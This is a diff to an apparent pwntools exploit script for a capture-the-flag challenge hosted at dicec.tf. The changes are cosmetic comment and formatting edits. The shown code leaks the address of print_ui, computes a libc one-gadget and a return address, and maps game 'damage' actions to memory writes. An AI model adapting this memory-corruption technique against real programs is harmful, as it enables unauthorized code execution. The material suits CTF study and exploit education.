@@ -123,7 +123,6 @@ def sub_byte(addr_offset, val):
     global actions, dmgs, latest
     offset = addr_offset - 11
     for i, dmg in enumerate(dmgs):
-        # print(dmg)
         if dmg == val and isnothing(i):
             actions[i] = offset
             print("Action", i, "caused",  dmg, "damage")
@@ -139,7 +138,6 @@ def set_byte(addr_offset, val):
     offset = addr_offset - 11
     found_zero = False
     for i, dmg in enumerate(dmgs):
-        # print(dmg)
         if not found_zero and dmg == -1 and isnothing(i):
             actions[i] = offset
             print("Action", i, "zeroed", addr_offset)
@@ -182,11 +180,13 @@ r = remote("dicec.tf", 32030)
 
 # Get a leak of main to find the data address
 first_resp = r.recvuntil(b' > ')
+# get_hex returns all strings of the form 0x[0-9a-f] as numbers. The last one will be &print_ui.
 leak = get_hex(first_resp)[-1]
 
 chal.address = leak - chal.symbols["print_ui"]
 
-onegadget = 0xebce2;
+
+onegadget = 0xebce2
 retaddr = libc.symbols["__libc_start_call_main"] + 128
 
 bonegadget = p64(onegadget)
